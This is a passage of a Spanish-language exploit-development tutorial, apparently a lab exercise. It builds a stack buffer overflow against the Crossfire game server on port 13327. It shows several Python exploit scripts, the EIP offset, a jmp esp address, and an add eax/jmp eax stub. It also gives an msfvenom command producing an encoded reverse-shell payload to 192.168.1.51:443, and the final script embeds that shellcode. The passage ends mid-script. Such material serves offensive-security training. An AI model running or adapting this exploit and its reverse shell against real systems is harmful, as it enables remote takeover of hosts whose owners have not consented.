k5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp&quot;</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span> 

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 

    <span class="nb">print</span> <span class="s2">&quot;[*] Enviando buffer...&quot;</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">data</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span> <span class="s2">&quot;[*] Payload Enviado!&quot;</span> 
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error conectando con el servicio...</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>En el resultado desde <strong>edb</strong>, observamos la siguiente respuesta:</p>
<div class="codehilite"><pre><span></span><code>The<span class="w"> </span>debugged<span class="w"> </span>application<span class="w"> </span>encountered<span class="w"> </span>a<span class="w"> </span>segmentation<span class="w"> </span>fault.
The<span class="w"> </span>address<span class="w"> </span>0x46367046<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>appear<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>mapped.

If<span class="w"> </span>you<span class="w"> </span>would<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>pass<span class="w"> </span>this<span class="w"> </span>exception<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>application<span class="w"> </span>press<span class="w"> </span>Shift+<span class="o">[</span>F7/F8/F9<span class="o">]</span>
</code></pre></div>

<p>Teniendo estos valores que han sobreescrito el <strong>EIP</strong>, calculamos el Offset:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop/BoF<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46367046</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exact<span class="w"> </span>match<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">4368</span>
</code></pre></div>

<p>Sabiendo ya que su valor es 4368, montamos el siguiente PoC para corroborar que tomamos el control del <strong>EIP</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python </span>

<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;direccionIP&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">13327</span>

<span class="c1"># Total bytes: 4379</span>
<span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">4368</span> <span class="o">+</span> <span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">4379</span><span class="o">-</span><span class="mi">4368</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span> 

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 

    <span class="nb">print</span> <span class="s2">&quot;[*] Enviando buffer...&quot;</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">data</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span> <span class="s2">&quot;[*] Payload Enviado!&quot;</span> 
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error conectando con el servicio...</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Obviamente, hacemos relleno con el caracter <em>C</em> a fin de alcanzar los 4379 bytes. Obtenemos la siguiente respuesta desde <strong>edb</strong> tras enviar nuestro Buffer:</p>
<div class="codehilite"><pre><span></span><code>The<span class="w"> </span>debugged<span class="w"> </span>application<span class="w"> </span>encountered<span class="w"> </span>a<span class="w"> </span>segmentation<span class="w"> </span>fault.
The<span class="w"> </span>address<span class="w"> </span>0x42424242<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>appear<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>mapped.

If<span class="w"> </span>you<span class="w"> </span>would<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>pass<span class="w"> </span>this<span class="w"> </span>exception<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>application<span class="w"> </span>press<span class="w"> </span>Shift+<span class="o">[</span>F7/F8/F9<span class="o">]</span>
</code></pre></div>

<p>Dado que vemos que estamos tomando el control del EIP, la idea en este caso es analizar los registros con el objetivo de saber dónde situar nuestro Shellcode.</p>
<h4 id="register-enumeration">Register Enumeration<a class="headerlink" href="#register-enumeration" title="Permanent link">&para;</a></h4>
<p>En este punto, dado que sabemos que el tamaño total aceptado antes de que el programa crashee de otra forma es <strong>4379</strong>, tenemos en consideración que de buffer mandamos <strong>4368</strong> y tras sobreescribir el <strong>EIP</strong> añadimos <strong>4</strong> bytes, dejando un total de <strong>7 bytes</strong> para generar nuestras instrucciones.</p>
<p>Este margen de 7 bytes como podremos intuir dispone de un espacio muy pequeño para fijar nuestro Shellcode, lo que hace que tengamos que saltar a otro registro donde podamos situar nuestro Payload sin inconveniente (es una técnica). Si atendemos al registro <strong>EAX</strong>, una vez se produce el desbordamiento de buffer, vemos que apunta justo al principio de nuestro Buffer:</p>
<p><code>EAX: setup sound AAAAAAAAAAAAAAAA...</code></p>
<p>Si hacemos memoria, podemos recordar que el buffer que enviamos posee un tamaño aceptable de 4368 bytes, lo que hace que tengamos espacio de sobra para situar nuestro Shellcode. No supondría ningún problema el saltar al registro <strong>EAX</strong>, pero para ello debemos tener en cuenta que tras producirse el desbordamiento, nuestros caracteres que serán convertidos a Opcodes comenzarán a situarse en el registro <strong>ESP</strong>, lo que hace que primero debamos buscar una dirección en la memoria con permisos de ejecución para que desde el <strong>EIP</strong> se aplique un salto al registro <strong>ESP</strong> y posteriormente de aquí saltar al registro <strong>EAX</strong>.</p>
<p>Nos encontraremos con un problema tras saltar al registro <strong>EAX</strong>, pero lo abordaremos más adelante.</p>
<h4 id="jmp-esp-opcode">JMP ESP Opcode<a class="headerlink" href="#jmp-esp-opcode" title="Permanent link">&para;</a></h4>
<p>Recodemos que contamos con un margen de 7 bytes para definir nuestras instrucciones, donde una de ellas es el salto al registro <strong>EAX</strong> que pretendemos hacer para posteriormente situar nuestro Shellcode.</p>
<p>Lo primero será hacer que el registro <strong>EIP</strong> apunte al <strong>ESP</strong>, donde posteriormente insertaremos nuestros Opcodes. Para ello, desde <strong>edb</strong>, podemos tras producirse el desbordamiento presionar la tecla <strong>Ctrl+O</strong> para el <em>Opcode Searcher</em>. </p>
<p>Una vez abierto, seleccionamos la dirección del binario <strong>crossfire</strong> que cuenta con permisos de ejecución, seleccionando de la lista desplegable el salto <strong>ESP -&gt; EIP</strong>. Pinchamos en <strong>Find</strong> y esperamos a que el programa encuentre las direcciones donde se realizan el salto al registro <strong>ESP</strong>.</p>
<p>Encontramos la siguiente:</p>
<p><code>0x08134596: jmp esp</code></p>
<p>Como es de esperar, nuestro registro <strong>EIP</strong> tomará dicho valor en formato <em>Little Endian</em>:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python </span>

<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;direccionIP&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">13327</span>

<span class="c1"># Total bytes: 4379</span>
<span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">4368</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="mh">0x08134596</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">4379</span><span class="o">-</span><span class="mi">4368</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span> 

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 

    <span class="nb">print</span> <span class="s2">&quot;[*] Enviando buffer...&quot;</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">data</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span> <span class="s2">&quot;[*] Payload Enviado!&quot;</span> 
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error conectando con el servicio...</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Tras enviar el buffer, si establecemos previamente con la tecla <strong>F2</strong> un <em>breakpoint</em> en el registro <strong>0x08134596</strong>, podremos ver como el aplicativo muestra que el registro <strong>EIP</strong> apunta a la dirección <strong>0x08134596</strong>, correspondiente al <strong>ESP</strong>. Pulsando la tecla <strong>F8</strong>, avanzaremos una instrucción por pulsación, donde se puede ver como las siguientes instrucciones son:</p>
<div class="codehilite"><pre><span></span><code>bffa:4de0<span class="w"> </span><span class="m">43</span><span class="w">           </span>inc<span class="w"> </span>ebx
bffa:4de1<span class="w"> </span><span class="m">43</span><span class="w">           </span>inc<span class="w"> </span>ebx
bffa:4de2<span class="w"> </span><span class="m">43</span><span class="w">           </span>inc<span class="w"> </span>ebx
bffa:4de3<span class="w"> </span><span class="m">43</span><span class="w">           </span>inc<span class="w"> </span>ebx
bffa:4de4<span class="w"> </span><span class="m">43</span><span class="w">           </span>inc<span class="w"> </span>ebx
bffa:4de5<span class="w"> </span><span class="m">43</span><span class="w">           </span>inc<span class="w"> </span>ebx
bffa:4de6<span class="w"> </span><span class="m">43</span><span class="w">           </span>inc<span class="w"> </span>ebx
</code></pre></div>

<p>Correspondiente a los 7 bytes finales de margen que tenemos donde por el momento se encuentran situados nuestro caracter <em>C</em>.</p>
<h4 id="jmp-eax-from-esp">JMP EAX From ESP<a class="headerlink" href="#jmp-eax-from-esp" title="Permanent link">&para;</a></h4>
<p>Ahora que controlamos el flujo del programa y estamos en el registro <strong>ESP</strong>, como este sólo cuenta con 7 bytes de margen, saltaremos al registro <strong>EAX</strong> con el objetivo de depositar posteriormente nuestro Shellcode.</p>
<p>Surge un problema a la hora de saltar al registro <strong>EAX</strong>, y es que la cadena '<em>setup sound</em>' es interpretada como <strong>Opcode</strong>:</p>
<div class="codehilite"><pre><span></span><code><span class="m">73</span><span class="w"> </span><span class="m">65</span><span class="w">   </span>jae<span class="w"> </span>0xb7487a75
<span class="m">74</span><span class="w"> </span><span class="m">75</span><span class="w">   </span>je<span class="w"> </span>0xb7487a87
<span class="m">70</span><span class="w"> </span><span class="m">20</span><span class="w">   </span>jo<span class="w"> </span>0xb7487a34
<span class="m">73</span><span class="w"> </span>6f<span class="w">   </span>jae<span class="w"> </span>0xb7487a85
<span class="m">75</span><span class="w"> </span>6e<span class="w">   </span>jne<span class="w"> </span>0xb7487a86
</code></pre></div>

<p>Esto puede causar inconvenientes, pues el flujo del programa como vemos puede tomar saltos a otras direcciones no deseadas haciendo que posteriormente nuestro Shellcode no sea interpretado.</p>
<p>La cadena '<em>setup sound</em>' ocupa 12 bytes (con espacios incluidos), por lo que algo inteligente a hacer desde <strong>nasm_shell.rb</strong> es aplicar los siguientes Opcodes:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop/BoF<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb </span>
nasm<span class="w"> </span>&gt;<span class="w"> </span>add<span class="w"> </span>eax,12
<span class="m">00000000</span><span class="w">  </span>83C00C<span class="w">            </span>add<span class="w"> </span>eax,byte<span class="w"> </span>+0xc
nasm<span class="w"> </span>&gt;<span class="w"> </span>jmp<span class="w"> </span>eax
<span class="m">00000000</span><span class="w">  </span>FFE0<span class="w">              </span>jmp<span class="w"> </span>eax
</code></pre></div>

<p>Desplazamos en un margen de 12 bytes el contenido de <strong>EAX</strong>, de forma que en estos 3 bytes de instrucción el registro se nos quedaría apuntando justo al comienzo de nuestro búffer (AAAAAAAA...), posteriormente en otros 2 bytes aplicamos un salto a dicho registro.</p>
<p>¿Lo bueno de todo esto?, que en total son 5 bytes de instrucción, y si recordamos contábamos con un margen de 7 bytes para realizar nuestras instrucciones... por lo tanto, de maravilla.</p>
<p>Estos Opcodes al fin y al cabo se traducen en "<strong>\x83\xC0\x0C\xFF\xE0</strong>", de forma que nuestro script quedaría tal y como se representa a continuación:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python </span>

<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;direccionIP&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">13327</span>

<span class="c1"># Total bytes: 4379</span>
<span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">4368</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="mh">0x08134596</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x83\xC0\x0C\xFF\xE0</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x90</span><span class="s2">&quot;</span>

<span class="n">buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x11</span><span class="s2">(setup sound &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x00</span><span class="s2">#&quot;</span> 

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 

    <span class="nb">print</span> <span class="s2">&quot;[*] Enviando buffer...&quot;</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="n">data</span> 
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="nb">print</span> <span class="s2">&quot;[*] Payload Enviado!&quot;</span> 
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Error conectando con el servicio...</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div>

<p>Obviamente, añadimos 2 bytes de <strong>NOPs</strong> para completar el tamaño de 4379 bytes. Ahora que el flujo del programa se encamina por donde queremos, la idea es sustituir nuestras <em>Aes</em> por nuestro Shellcode, teniendo en consideración que tras estar codificado por <em>shikata</em>, habrá que añadir unos 16 bytes de margen al principio del registro para que nuestro Shellcode se pueda decoficar.</p>
<p>¡Que no se nos olvide comprobar los Badchars!, que para este caso son "<strong>\x00\x0a\x0d\x20</strong>". Este paso no hace falta detallarlo, pues no es el más complejo que digamos y ya lo hemos visto en Windows. Simplemente tener en cuenta que con el espacio que contamos en el registro <strong>EAX</strong> podemos ir mandando los caracteres a fin de analizar cuáles de ellos dan problema.</p>
<h4 id="msfvenom-linux-payload">Msfvenom Linux Payload<a class="headerlink" href="#msfvenom-linux-payload" title="Permanent link">&para;</a></h4>
<p>Para generar nuestro Shellcode, aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop/BoF<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x20&quot;</span>
Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>compatible<span class="w"> </span>encoders
Attempting<span class="w"> </span>to<span class="w"> </span>encode<span class="w"> </span>payload<span class="w"> </span>with<span class="w"> </span><span class="m">1</span><span class="w"> </span>iterations<span class="w"> </span>of<span class="w"> </span>x86/shikata_ga_nai
x86/shikata_ga_nai<span class="w"> </span>succeeded<span class="w"> </span>with<span class="w"> </span>size<span class="w"> </span><span class="m">95</span><span class="w"> </span><span class="o">(</span><span class="nv">iteration</span><span class="o">=</span><span class="m">0</span><span class="o">)</span>
x86/shikata_ga_nai<span class="w"> </span>chosen<span class="w"> </span>with<span class="w"> </span>final<span class="w"> </span>size<span class="w"> </span><span class="m">95</span>
Payload<span class="w"> </span>size:<span class="w"> </span><span class="m">95</span><span class="w"> </span>bytes
Final<span class="w"> </span>size<span class="w"> </span>of<span class="w"> </span>c<span class="w"> </span>file:<span class="w"> </span><span class="m">425</span><span class="w"> </span>bytes
unsigned<span class="w"> </span>char<span class="w"> </span>buf<span class="o">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
<span class="s2">&quot;\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1&quot;</span>
<span class="s2">&quot;\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19&quot;</span>
<span class="s2">&quot;\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5&quot;</span>
<span class="s2">&quot;\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2&quot;</span>
<span class="s2">&quot;\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91&quot;</span>
<span class="s2">&quot;\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce&quot;</span>
<span class="s2">&quot;\x7d\x8c\x95\x1d\xfd&quot;</span><span class="p">;</span>
</code></pre></div>

<p>Por último, considerando el tamaño de 95 bytes generados, preparamos nuestro Búffer:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python </span>

<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Uso: python&quot;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot; &lt;direccionIP&gt;</span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">13327</span>

<span class="c1"># Shellcode (95 bytes) || msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d\x20&quot;</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x7d\x8c\x95\x1d\xfd</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># Total bytes: 4379</span>
<span class="n">crash</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">4368</span><span class="o">-</span><span class="mi">95</span><span class="o">-</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="mh">0x08134596</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x83\xC0\x0C\xFF\xE0</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x90\x90</span><span class="s2">&quot;</span>

<span class="c1"># 95 bytes</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91</span><span class="s2">&quot;</span>
